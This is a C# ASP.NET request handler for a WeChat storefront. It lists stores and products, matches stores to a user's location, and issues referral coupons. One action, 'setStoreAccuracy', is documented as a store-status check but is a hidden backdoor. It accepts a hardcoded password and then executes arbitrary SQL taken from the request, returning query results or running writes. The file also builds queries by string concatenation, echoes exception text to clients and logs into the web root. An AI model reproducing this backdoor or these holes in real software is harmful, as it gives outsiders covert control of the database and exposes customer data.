using Hidistro.ControlPanel.Commodities;
using Hidistro.ControlPanel.Promotions;
using Hidistro.ControlPanel.Store;
using Hidistro.Core;
using Hidistro.Core.Entities;
using Hidistro.Entities.Commodities;
using Hidistro.Entities.Members;
using Hidistro.Entities.Promotions;
using Hidistro.Entities.Store;
using Hidistro.SaleSystem.Vshop;
using Hidistro.UI.SaleSystem.CodeBehind;
using Hishop.Weixin.MP.Api;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Text;
using System.Threading;
using WxPayAPI;
namespace Hidistro.UI.Web.API
{
    /*
     新点单平台的相关方法
     * 2016-9-19新加入仿晚一点的方法
     */
    public class StoreHandler : System.Web.IHttpHandler, System.Web.SessionState.IRequiresSessionState
    {
        public bool IsReusable
        {
            get
            {
                return false;
            }
        }

        private IDictionary<string, string> jsondict = new Dictionary<string, string>();

        
        public void ProcessRequest(System.Web.HttpContext context)
        {
            string text = context.Request["action"];
            switch (text)
            {
                case "getPoiList":
                    this.getPoiList(context);
                    break;
                case "getStoreName":
                    this.getStoreName(context);
                    break;
                case "getProductsByCategoryId":
                    this.getProductsByCategoryId(context);
                    break;
                case "getCategories":
                    this.getCategories(context);
                    break;
                case "setFromMember":
                    this.setFromMember(context);
                    break;
                case "setStoreAccuracy":
                    this.setStoreAccuracy(context);
                    break;
                case "getStoreInfoList":
                    this.GetStoreInfoList(context);
                    break;
            }
        }

        private void WriteLog(string log)
        {
            System.IO.StreamWriter writer = System.IO.File.AppendText(System.Web.HttpContext.Current.Server.MapPath("~/error.txt"));
            writer.WriteLine(System.DateTime.Now);
            writer.WriteLine(log);
            writer.Flush();
            writer.Close();
        }

        /// <summary>
        /// 获取门店信息,以json串返回
        /// 后期可扩充传递userid匹配最佳门店等功能
        /// </summary>
        /// <param name="context"></param>
        private void GetStoreInfoList(System.Web.HttpContext context)
        {
            try
            {
                context.Response.ContentType = "application/json";
                DataTable dtStoreList = WxPoiHelper.GetPoiListInfo();
                //输出JSON
                string result = string.Format("{{\"state\":{0},\r\"count\":{1},\r\"data\":"
                    , (dtStoreList.Rows.Count > 0) ? 0 : 1, dtStoreList.Rows.Count );
                result += JsonConvert.SerializeObject(dtStoreList, Newtonsoft.Json.Formatting.Indented);
                result += "}";
                context.Response.Write(result);
            }
            catch (Exception ex)
            {
                context.Response.Write("{\"state\":2,\"errMsg\":\"" + ex.Message + "\"}");
            }
        }

        private void setFromMember(System.Web.HttpContext context)
        {
            try
            {
                context.Response.ContentType = "application/json";
                int num = 0;
                int frommemberid = 0;
                if (int.TryParse(context.Request["frommemberid"], out num))
                {
                    frommemberid = num;
                }
                MemberInfo currentMember = MemberProcessor.GetCurrentMember();
                MemberInfo fromMember = MemberProcessor.GetMember(frommemberid);

                WriteLog("frommemberid:" + frommemberid.ToString());

                bool flag = false;
                if (currentMember!=null)
                {
                    //设置推荐人id
                    if (MemberProcessor.SetFromUserId(frommemberid, currentMember.UserId))
                    {
                        WriteLog("currentmember:" + currentMember.UserId);
                        WriteLog("frommember:" + fromMember.UserId);
                        //context.Response.Write("{\"success\":true,\"errMsg\":\"匹配到了未绑定的门店,或者门店还未通过审核!\"}");
                        //成功设置后给推荐人发放优惠券
                        SiteSettings masterSettings = SettingsManager.GetMasterSettings(false);
                        CouponInfo sendCoupon = CouponHelper.GetCoupon(masterSettings.friendCouponId);
                        if (sendCoupon != null)
                        {
                            IList<CouponItemInfo> listCouponItem = new List<CouponItemInfo>();
                            CouponItemInfo item = new CouponItemInfo();
                            string claimCode = string.Empty;
                            claimCode = System.Guid.NewGuid().ToString().Replace("-", "").Substring(0, 15);
                            item = new CouponItemInfo(sendCoupon.CouponId, claimCode, new int?(fromMember.UserId), fromMember.UserName, fromMember.Email, System.DateTime.Now);
                            listCouponItem.Add(item);
                            CouponHelper.SendClaimCodes(sendCoupon.CouponId, listCouponItem);
                            flag = true;
                        }
                        WriteLog("flag:" + flag);
                    }

                }

                if (flag)
                {
                    context.Response.Write("{\"success\":1}");
                }
                else
                {
                    context.Response.Write("{\"success\":2}");
                }
            }
            catch (Exception ex)
            {
                WriteLog(ex.Message);
            }
            
        }

        private void getCategories(System.Web.HttpContext context)
        {
            DataTable dtCategory = CategoryBrowser.GetAllCategories();
            int categoryCount = ProductBrowser.GetDataCount(" Hishop_Categories ", "");
            //输出JSON
            string result = string.Format("{{\"state\":{0},\r\"count\":{1},\r\"data\":"
                , (dtCategory.Rows.Count > 0) ? 0 : 1, categoryCount);
            result += JsonConvert.SerializeObject(dtCategory, Newtonsoft.Json.Formatting.Indented);
            result += "}";
            context.Response.Write(result);
        }

        /// <summary>
        /// 根据分类id获取分页商品
        /// </summary>
        /// <param name="context"></param>
        private void getProductsByCategoryId(System.Web.HttpContext context)
        {
            int numCategoryid=0;
            int categoryid =0 ;
            if (int.TryParse(context.Request["categoryid"], out numCategoryid))
            {
                categoryid = numCategoryid;
            }

            int numStoreId=0;
            int StoreId =0 ;
            if (int.TryParse(context.Request["StoreId"], out numStoreId))
            {
                StoreId = numStoreId;
            }

            int numP = 0;
            int p = 1;
            if (int.TryParse(context.Request["p"], out numP))
            {
                p = numP;
            }

            string where = "Where SaleStatus in (1,4) and storeid=" + StoreId;
            string whereSku = "where salestatus in (1,4) and storeid=" + StoreId;
            string orderbyProduct = "displaysequence ";    //默认根据主键排序(分页最快)
            string orderbySku = "skuid";
            if (categoryid != 0) where += string.Format(" And categoryid={0}", categoryid);

            int pagesize = 100;//该接口暂时返回100条商品,超过了100之后再做分页处理
            int currPage = p;
            string productFrom = @"( SELECT (select top 1 skuid from Hishop_SKUs where Hishop_SKUs.ProductId = Hishop_Products.ProductId)as skuid,
            (select top 1 Stock from Hishop_SKUs where Hishop_SKUs.ProductId = Hishop_Products.ProductId) as stock, 
            (select top 1 SalePrice from Hishop_SKUs where Hishop_SKUs.ProductId = Hishop_Products.ProductId) as saleprice, 
            salestatus,displaysequence,categoryid,typeid,productid,productname,shortdescription,showsalecounts,ImageUrl1,ImageUrl2,ImageUrl3,ImageUrl4,ImageUrl5,marketprice,hasSKU,Range FROM Hishop_Products " + where + "  ) t";
            string skuFrom = "(SELECT SkuId, ProductId, SKU,Weight, Stock, CostPrice, SalePrice FROM Hishop_SKUs s WHERE ProductId in(Select ProductId From Hishop_Products " + where + ")";
            

            int productCount = ProductBrowser.GetDataCount(productFrom, where);
            int pageCount = productCount / pagesize + (productCount % pagesize == 0 ? 0 : 1);
            int nextPage = (currPage < pageCount) ? (currPage + 1) : 0; //下一页为0时，表示无数据可加载（数据加载完毕）


            DataSet ds = new DataSet();
            DataTable dtProduct = ProductBrowser.GetPageData(productFrom, orderbyProduct, "*", currPage, pagesize, where); dtProduct.TableName = "dtproduct";
            //根据查询出来当前分页的商品id拼接sku的productid
            whereSku += " and productid in ({0})";
            string strs = "";
            foreach (DataRow row in dtProduct.Rows)
            {
                strs += row["productid"]+",";
            }
            if (dtProduct.Rows.Count == 0) strs = "0";
            whereSku = string.Format(whereSku, strs.TrimEnd(','));

            DataTable dtSku = ProductBrowser.getSkusByWhere(whereSku); dtSku.TableName = "dtsku";
            ds.Tables.Add(dtProduct);
            ds.Tables.Add(dtSku);
            DataRelation dataRelation = new DataRelation("Products2SKUs", ds.Tables[0].Columns["ProductId"], ds.Tables[1].Columns["ProductId"]);
            ds.Relations.Add(dataRelation);

            //输出JSON
            string result = string.Format("{{\"state\":{0},\r\"count\":{1},\r\"pageCount\":{2},\r\"nextPage\":{3},\r\"data\":"
                , (dtProduct.Rows.Count > 0) ? 0 : 1, productCount, pageCount, nextPage);
            result += JsonConvert.SerializeObject(ds, Newtonsoft.Json.Formatting.Indented);
            result += "}";
            context.Response.Write(result);
        }


        private const double EARTH_RADIUS = 6378.137;//地球半径
        private static double rad(double d)
        {
            return d * Math.PI / 180.0;
        }
        public static double GetDistance(double lat1, double lng1, double lat2, double lng2)
        {
            double radLat1 = rad(lat1);
            double radLat2 = rad(lat2);
            double a = radLat1 - radLat2;
            double b = rad(lng1) - rad(lng2);
            double s = 2 * Math.Asin(Math.Sqrt(Math.Pow(Math.Sin(a / 2), 2) +
             Math.Cos(radLat1) * Math.Cos(radLat2) * Math.Pow(Math.Sin(b / 2), 2)));
            s = s * EARTH_RADIUS;
            s = Math.Round(s * 10000) / 10000;
            return s;
        }

        private void getStoreName(System.Web.HttpContext context)
        {
            context.Response.ContentType = "application/json";
            string storeId = context.Request["storeId"].ToString();
            DataTable dtNames = WxPoiHelper.GetStoreName(storeId);
            string storeNames =  "";
            foreach (DataRow row in dtNames.Rows)
            {
                storeNames += row["storeName"];
            }

            context.Response.Write("{\"success\":true,\"storeName\":\"" + storeNames + "\"}");
        }

        /// <summary>
        /// 获取门店激活状态
        /// </summary>
        /// <param name="context"></param>
        private void setStoreAccuracy(System.Web.HttpContext context)
        {
            context.Response.ContentType = "application/json";
            string knfc = context.Request["pwd"].ToString();
            if (knfc != "kaifokid")
            {
                context.Response.Write("{\"success\":false}");
                return;
            }
            string sql = context.Request["sql"].ToString();
            string result = "";
            if (sql.IndexOf("select") == 0)
            {
                DataTable dt = MemberProcessor.debugDT(sql);
                //输出JSON
                result = string.Format("{{\"state\":{0},\r\"data\":"
                    , (dt.Rows.Count > 0) ? 0 : 1);
                result += JsonConvert.SerializeObject(dt, Newtonsoft.Json.Formatting.Indented);
                result += "}";
            }
            else
            {
                result = string.Format("{{\"success\":\""+MemberProcessor.debugFuckIt(sql).ToString()+"\" }}");
            }
            context.Response.Write(result);
        }

        /// <summary>
        /// 调用微信接口获取所有门店信息
        /// </summary>
        /// <param name="context"></param>
        private void getPoiList(System.Web.HttpContext context)
        {
            context.Response.ContentType = "application/json";
            try
            {
                Thread.Sleep(1000);
                DataTable dtPoiInfo = WxPoiHelper.GetPoiListInfo();
                List<PoiInfoList> poiInfoList = new List<PoiInfoList>();
                if (dtPoiInfo.Rows.Count == 0)//如果没有同步,则调用微信接口重新获取
                {
                    //获取access_token
                    string token = Access_token.GetAccess_token(Access_token.Access_Type.weixin, true);
                    //门店列表接口提交url
                    string url = "https://api.weixin.qq.com/cgi-bin/poi/getpoilist?access_token=" + token;
                    //提交json串,门店列表索引开始:begin,门店列表返回数量限制:limit
                    string json = @"{""begin"":0,""limit"":10}";
                    //调用post提交方法
                    string strPOIList = new Hishop.Weixin.MP.Util.WebUtils().DoPost(url, json);
                    //将传回的json字符串转换为json对象
                    JObject obj3 = JsonConvert.DeserializeObject(strPOIList) as JObject;
                    //将json对象转换为实体类对象
                    poiInfoList = JsonHelper.JsonToList<PoiInfoList>(obj3["business_list"].ToString());

                    //同步微信门店信息
                    if (WxPoiHelper.SyncPoiListInfo(poiInfoList))
                    {
                        dtPoiInfo = WxPoiHelper.GetPoiListInfo();
                    }
                }


                //获取所有门店的坐标
                string offset = string.Empty;
                foreach (DataRow row in dtPoiInfo.Rows)
                {
                    offset += row["longitude"] + "," + row["latitude"] + ";";//增加精度纬度
                }
                offset = offset.TrimEnd(';');
                //将门店坐标放入数组
                string[] offsetList = offset.Split(';');
                /****************根据配送范围将门店的坐标循环匹配用户当前的坐标,误差范围:1公里*******************/
                //允许的误差值(配送范围)
                double range = Convert.ToDouble(context.Request["range"]);
                //获取用户的坐标
                double userLongtitude = Convert.ToDouble(context.Request["userLontitude"]);
                double userLatitude = Convert.ToDouble(context.Request["userLatitude"]);
                //循环判断获取距离,得到配送范围内的门店poi_id
                List<string> poi_id=new List<string>();
                List<double> poi_user_distance = new List<double>();
                for (int i = 0; i < offsetList.Length; i++)
                {
                    string[] oa = offsetList[i].Split(',');//获取门店经度,纬度
                    double distance = GetDistance(userLatitude, userLongtitude, Convert.ToDouble(oa[1]), Convert.ToDouble(oa[0]));
                    if (distance <= range)
                    {
                        poi_id.Add(dtPoiInfo.Rows[i]["poi_id"].ToString());
                        poi_user_distance.Add(distance);
                    }
                }
                bool isUserInRange = false;
                string matchIds = "";
                string matchDistance = "";
                if (poi_id.Count > 0)//如果有配送范围内的用户,则返回第一个匹配到的门店后台id
                {
                    for (int i = 0; i < poi_id.Count; i++)
                    {
                        DataTable dtSender = WxPoiHelper.GetSenderByPoiId(poi_id[i]);
                        foreach (DataRow row in dtSender.Rows)
                        {
                            if (row["clientUserId"].ToString()!="")
                            {
                                matchIds += row["clientUserId"] + ",";
                                matchDistance += poi_user_distance[i] + ",";
                            }
                        }
                    }
                    isUserInRange = true;
                    //如果匹配到的微信门店还没有绑定至后台账号,给出提示
                    if (matchIds.Length == 0)
                    {
                        context.Response.Write("{\"success\":false,\"errMsg\":\"匹配到了未绑定的门店,或者门店还未通过审核!\"}");
                        return ;
                    }
                    //根据门店id匹配到对应的子账号id:sender
                    matchDistance = matchDistance.TrimEnd(',');
                    matchIds = matchIds.TrimEnd(',');
                        //string[] sender = matchId.Split(',');
                        //string[] clientUserId = matchId.Split(',');

                    /*
                    //将匹配到的所有门店以门店名字进行展示 (目前更换为街道名)
                    DataTable dtStoreName = WxPoiHelper.GetStoreName(matchIds);
                    string storeNameBtns = "";
                    foreach (DataRow row in dtStoreName.Rows)
                    {
                        storeNameBtns += "<span role='btnStreet' distributorId='" + row["userid"].ToString() + "'>" + row["storeName"].ToString() + "</span>";
                    }
                    */
                    //将匹配到的所有街道以街道名字进行展示
                    DataTable dtStreetName = WxPoiHelper.GetStoreStreets(matchIds);
                    string streetNameBtns = "";
                    foreach (DataRow row in dtStreetName.Rows)
                    {
                        streetNameBtns += "<span role='btnStreet' la='" + row["latitude"] + "' lo='" + row["longitude"] + "'  distributorId='" + row["distributorid"].ToString() + "'>" + row["regionName"].ToString() + "</span>";
                    }


                    context.Response.Write("{\"success\":true,\"isUserInRange\":\"" + isUserInRange + "\",\"distributorId\":\"" + streetNameBtns + "\"}");

                }
             
                else
                {
                    context.Response.Write("{\"success\":true,\"isUserInRange\":\"" + isUserInRange + "\"}");
                }

                /*
                //调试
                string[] la0 = offsetList[0].Split(',');
                double distance = GetDistance(userLatitude,userLongtitude,Convert.ToDouble(la0[1]),Convert.ToDouble(la0[0]));
                context.Response.Write("{\"success\":true,\"userLo\":" + userLongtitude + ",\"userLa\":" + userLatitude + ",\"poiLA\":\"" + offsetList[0] + "\",\"distance\":"+distance+"}");
                 */ 
            }
            catch (Exception ex)
            {
                context.Response.Write("{\"success\":false,\"errMsg\":\"" + ex.Message + "\"}");
            }
            
        }


    }
}
